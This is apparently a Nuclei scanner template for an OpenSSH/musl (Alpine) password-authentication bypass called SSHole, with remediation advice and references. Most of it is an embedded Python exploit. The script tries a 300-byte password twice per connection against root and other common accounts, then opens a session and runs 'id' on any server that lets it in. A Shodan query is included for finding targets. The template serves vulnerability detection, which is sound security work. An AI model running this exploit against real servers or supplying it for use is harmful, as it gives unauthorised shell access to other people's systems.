id: sshole-auth-bypass

info:
  name: SSHole - OpenSSH/musl Password Auth Bypass
  author: DhiyaneshDk
  severity: critical
  description: |
    Exploits the SSHole password-authentication bypass on OpenSSH servers built against musl libc (Alpine Linux). Sends two password auth attempts within a single SSH connection using a >256-byte password.Attempt 1 fails (pick_salt overwrites musl static getspnam buffer). Attempt 2 succeeds (pick_salt returns cached salt, buffer intact, crypt(long_pw, borrowed_$6$_salt) = "*" matches shadow "*").
  remediation: |
    Upgrade to openssh 10.6p2 or backported Alpine packages.Workaround: MaxAuthTries 1.
  reference:
    - https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/
    - https://www.openssh.com/releasenotes.html#10.6p2
  classification:
    cwe-id: CWE-305
  metadata:
    verified: true
    max-request: 1
    shodan-query: product:"OpenSSH"
  tags: code,ssh,vuln,alpine,musl,auth-bypass,sshhole,network

code:
  - engine:
      - python3
      - python

    source: |
      import sys, os, socket
      try:
          import paramiko
      except ImportError:
          print("SKIP paramiko not installed")
          sys.exit(0)
      import logging
      logging.getLogger("paramiko").setLevel(logging.CRITICAL)

      raw = sys.stdin.read().strip()
      if ":" in raw:
          host, port = raw.rsplit(":", 1)
          port = int(port)
      else:
          host, port = raw, 22

      try:
          s = socket.create_connection((host, port), timeout=5)
          banner = s.recv(256).decode(errors="replace").strip()
          s.close()
      except Exception as e:
          print(f"CONNECTION_FAILED {host}:{port} {e}")
          sys.exit(0)
      if "OpenSSH" not in banner:
          print(f"NOT_OPENSSH banner={banner}")
          sys.exit(0)
      print(f"BANNER {banner}")

      PW = "A" * 300
      USERS = ["root", "victim", "nobody", "ftp", "ntp", "sshd", "guest"]

      for user in USERS:
          try:
              t = paramiko.Transport((host, port))
              t.connect()
              # Attempt 1 -- expected FAIL (shadow buffer aliasing)
              a1 = False
              try:
                  t.auth_password(user, PW)
                  a1 = True
              except paramiko.AuthenticationException:
                  pass
              except Exception:
                  t.close()
                  continue
              if a1:
                  try:
                      ch = t.open_session()
                      ch.exec_command("id")
                      out = ch.makefile().read().decode().strip()
                      ch.close()
                  except:
                      out = "session-open"
                  t.close()
                  print(f"BYPASS_CONFIRMED user={user} attempt=1 id={out}")
                  sys.exit(0)
              # Attempt 2 -- expected PASS (cached salt)
              try:
                  t.auth_password(user, PW)
              except paramiko.AuthenticationException:
                  t.close()
                  continue
              except Exception:
                  t.close()
                  continue
              try:
                  ch = t.open_session()
                  ch.exec_command("id")
                  out = ch.makefile().read().decode().strip()
                  ch.close()
              except:
                  out = "session-open"
              t.close()
              print(f"BYPASS_CONFIRMED user={user} attempt=2 id={out}")
              sys.exit(0)
          except Exception:
              continue
      print("BYPASS_FAILED")

    matchers:
      - type: word
        words:
          - "BYPASS_CONFIRMED"

    extractors:
      - type: regex
        name: bypassed_user
        group: 1
        regex:
          - "user=(\\S+)"
